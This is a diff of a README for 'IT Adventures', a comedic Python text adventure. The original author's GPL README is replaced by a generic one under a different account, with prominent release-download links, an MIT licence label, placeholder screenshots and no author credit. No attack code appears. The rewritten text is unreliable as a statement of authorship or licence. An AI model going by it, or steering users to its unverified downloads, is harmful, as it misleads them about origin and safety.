@@ -1,153 +1,154 @@
-# IT Adventures – Nerdstown Chronicles  
-#### Author: Luca Bocaletto  
-#### OS: Linux  
-#### Genre: Text Adventures
+# IT Adventures: A Comedic Tech-Heavy Text Adventure Game 🎮💻
 
-**A comedic, tech-heavy text adventure in pure open-source style**  
-
-In **IT Adventures**, you don the hoodie of Luca, a quick-witted sysadmin with a knack for command-line humor. Your playground is **Nerdstown**, a neon-lit city where Ethernet cables crisscross sidewalks like vines, and cafés brew “Espresso at 5 GHz.” You’ll start in your cluttered hacker den—monitor towers balanced like Jenga blocks, Linux stickers plastering every surface, and a cat furiously tapping on a keyboard—before venturing out to:
-
-- **TechCorp’s open-space**: dodge crashing 500 errors, scavenge discarded hard drives, and face your first fetch quest.  
-- The **Bean Overclock Café**: where baristas challenge you with impromptu Linux quizzes while you sip a “Latte 16-Thread.”  
-- The **Data Center**: a labyrinth of buzzing server racks where you’ll wield soldering irons and power banks to revive dead disks.  
-- Hidden corners like the **Retro Museum**, where you prove your vintage lore with Apple I trivia, and the **Secret AI Lab**, locked behind sudo-only doors.
-
-Along the way you’ll tackle:
-
-  • **Linux quizzes** on commands, file permissions, TCP ports and shell scripts—each correct answer awards XP and reputation.  
-  • **Hardware repair missions**: swap bad RAM, solder broken traces, and replace failed power supplies to unlock new areas.  
-  • **Fetch quests** to locate rare items (RGB RAM sticks, Raspberry Pi modules, power banks) scattered across Nerdstown.  
-  • **Dynamic events**—random DDoS alerts, surprise blackouts, retro‐tech puzzles—that force you to think on your feet and type lightning-fast fixes.  
-  • **Eccentric NPCs**: from an RGB-obsessed memory vendor to “Diego The Skid,” a forty-year hacker legend who tests your scp skills.
-
-Every success nets you **XP**, in-game **credits**, open-source **tokens** and coveted **reputation**. Level up to earn `sudo` privileges, open restricted rooms and negotiate high-stakes side-quests. Whether you’re debugging a cron job gone rogue, outsmarting a firewall with clever iptables rules, or simply showing off your grep mastery, **IT Adventures** turns every shell command into a triumph—one witty one-liner at a time.
-
-<p align="center">
-  <a href="./index.html">
-    <img src="https://img.shields.io/badge/View–English%20Site–index.html-blue?style=for-the-badge" alt="English Version" />
-  </a>
-  <a href="./index-ita.html">
-    <img src="https://img.shields.io/badge/Visualizza–Versione%20Italiana–index-ita.html-blue?style=for-the-badge" alt="Versione Italiana" />
-  </a>
-</p>
+![IT Adventures](https://img.shields.io/badge/IT%20Adventures-v1.0.0-blue.svg)
+[![Release](https://img.shields.io/badge/Release-Download%20Latest%20Version-brightgreen)](https://github.com/jaheere/IT-Adventures/releases)
 
 ---
 
-## 📁 Project Structure
+## Overview
 
-```
-it-adventures/
-├── data/                # Game content (editable)
-│   ├── world.json       # Rooms, descriptions, exits, events
-│   ├── missions.json    # Missions list (quiz, fetch, event)
-│   ├── items.json       # Items, descriptions, usable contexts
-│   └── npcs.json        # NPCs, dialogues, side-quests
-│
-├── save.json            # Auto-save state
-│
-├── src/                 
-│   ├── data.py          # Load/save data, game state
-│   ├── ui.py            # Colorful rendering with Rich (HUD, rooms, tables)
-│   ├── engine.py        # Main menu and game loop
-│   ├── quests.py        # Mission logic (quiz, fetch, events)
-│   └── npcs.py          # NPC dialogues and interactions
-│
-├── requirements.txt     # Dependencies (rich)  
-├── Dockerfile           # Minimal container  
-├── .gitignore           
-└── README.md            # This file  
-```
+Welcome to **IT Adventures**, a comedic text adventure game where technology meets humor. Slip into the shoes of **Luca**, a witty sysadmin navigating the vibrant streets of **Nerdstown**. Armed with a laptop and a sharp tongue, you’ll tackle tech challenges and laugh your way through this open-source journey.
 
 ---
 
-## 🚀 Installation & Launch
+## Features
 
-1. **Clone the repository**  
+- **Engaging Storyline**: Experience a rich narrative filled with quirky characters and tech-related humor.
+- **Interactive Gameplay**: Make choices that affect the outcome of your adventure.
+- **Open Source**: Contribute to the project and help us grow.
+- **Cross-Platform**: Play on any device that supports Python.
+
+---
+
+## Installation
+
+To get started, download the latest version from our [Releases section](https://github.com/jaheere/IT-Adventures/releases). Follow the instructions to set up the game on your local machine.
+
+### Prerequisites
+
+- Python 3.x installed on your system.
+- Basic knowledge of terminal commands.
+
+### Setup Instructions
+
+1. Clone the repository:
+
    ```bash
-   git clone https://github.com/bocaletto-luca/IT-Adventures.git
+   git clone https://github.com/jaheere/IT-Adventures.git
    cd IT-Adventures
    ```
 
-2. **Create a virtual environment (recommended)**  
-   ```bash
-   python3 -m venv venv
-   source venv/bin/activate
-   ```
+2. Install the required dependencies:
 
-3. **Install dependencies**  
    ```bash
    pip install -r requirements.txt
    ```
 
-4. **Start the game**  
+3. Run the game:
+
    ```bash
-   python3 src/engine.py
+   python main.py
    ```
 
-5. **Using Docker**  
-   ```bash
-   docker build -t it-adventures .
-   docker run -it it-adventures
-   ```
+4. Enjoy your adventure in Nerdstown!
 
 ---
 
-## 🎮 Main Commands
+## Gameplay
 
-### Main Menu  
-- `1` New Game  
-- `2` Load Game  
-- `3` Save Game  
-- `4` Help  
-- `5` Exit  
+In **IT Adventures**, you navigate through a series of scenarios that challenge your problem-solving skills and wit. Each decision you make leads to different outcomes, making every playthrough unique.
 
-### In-Game  
-- `go <direction>` (e.g. `go north`)  
-- `take <item>` (e.g. `take kit_soldering`)  
-- `use <item>` (when supported)  
-- `inventory` / `inv`  
-- `missions`  
-- `start <id>` (start a mission)  
-- `talk <npc_id>` (interact with NPC)  
-- `status` (show HUD)  
-- `look`  
-- `save`  
-- `exit` (return to menu or quit)
+### Key Locations
+
+- **Nerdtown Square**: The heart of the city, filled with fellow tech enthusiasts.
+- **Café 5 GH**: Grab an espresso while you troubleshoot network issues.
+- **Data Alley**: A maze of cables and servers where you might encounter unexpected challenges.
+
+### Characters
+
+- **Luca**: Your guide and protagonist, known for his sarcasm and tech-savvy skills.
+- **The IT Crowd**: A group of quirky characters you’ll meet along the way, each with their own story.
 
 ---
 
-## 🌟 Key Features
+## Topics Covered
 
-- **Comic & Technical**: witty lines about Linux, sysadmin life, open-source culture, “sudo”, “root”, “bugs”, “RGB RAM.”  
-- **Branching Missions**: Linux quizzes, fetch quests, sysadmin puzzles.  
-- **NPC Side-Quests**: humorous dialogues, reputation gains, collectible badges.  
-- **Dynamic HUD**: levels, XP, credits, OSS tokens and reputation always visible.  
-- **Modular Design**: add rooms, missions, NPCs or items simply by editing the JSON files in `data/`.
+This game delves into various topics related to technology and IT, including:
 
----
-
-## 🔧 How to Extend
-
-- **Add New Rooms**  
-  Edit `data/world.json` to define titles, descriptions, exits, items and optional events.
-
-- **Create Missions**  
-  Expand `data/missions.json` with types `quiz`, `fetch` or `event`, specifying prompts, options and rewards.
-
-- **Define NPCs**  
-  Add dialogues and side-quests in `data/npcs.json`, complete with intros, dialogue trees and rewards.
-
-- **Customize the HUD**  
-  Tweak `src/ui.py` to change colors, layout or ASCII art.
+- **System Administration**: Learn the ins and outs of managing systems.
+- **Linux Commands**: Get familiar with essential terminal commands.
+- **Networking**: Understand the basics of networking through engaging scenarios.
+- **Tech Humor**: Enjoy light-hearted jokes and puns related to the tech world.
 
 ---
 
-## 📜 License
+## Contributing
 
-Distributed under **GNU GPL v3**. See `LICENSE` for details.
+We welcome contributions from the community! If you have ideas, bug fixes, or features to suggest, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push to your forked repository.
+5. Submit a pull request.
+
+### Code of Conduct
+
+Please adhere to our [Code of Conduct](CODE_OF_CONDUCT.md) to maintain a positive environment for all contributors.
 
 ---
 
-Thank you for choosing **IT Adventures**! Get ready to laugh, learn, and celebrate the power of open source in an unparalleled text-based journey. Have fun!  
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
 ---
+
+## Support
+
+If you encounter issues or have questions, please check the [Issues section](https://github.com/jaheere/IT-Adventures/issues) or reach out to the community for support.
+
+---
+
+## Acknowledgments
+
+- Special thanks to all contributors and supporters of the project.
+- Inspired by classic text adventures and the vibrant tech community.
+
+---
+
+## Stay Updated
+
+For the latest updates, visit our [Releases section](https://github.com/jaheere/IT-Adventures/releases) and keep an eye on upcoming features and improvements.
+
+---
+
+## Fun Extras
+
+### Memes & Humor
+
+Check out our collection of tech memes related to the game. Share your favorites with friends and spread the laughter!
+
+### Community Events
+
+Join our Discord server for community events, game nights, and discussions. Connect with fellow players and share your experiences.
+
+---
+
+## Screenshots
+
+![Nerdtown Square](https://example.com/screenshot1.png)
+![Café 5 GH](https://example.com/screenshot2.png)
+![Data Alley](https://example.com/screenshot3.png)
+
+---
+
+## Contact
+
+For inquiries, please reach out to us at [contact@itadventures.com](mailto:contact@itadventures.com).
+
+---
+
+## Final Note
+
+Dive into **IT Adventures** today and explore the humorous side of technology. Your adventure awaits!
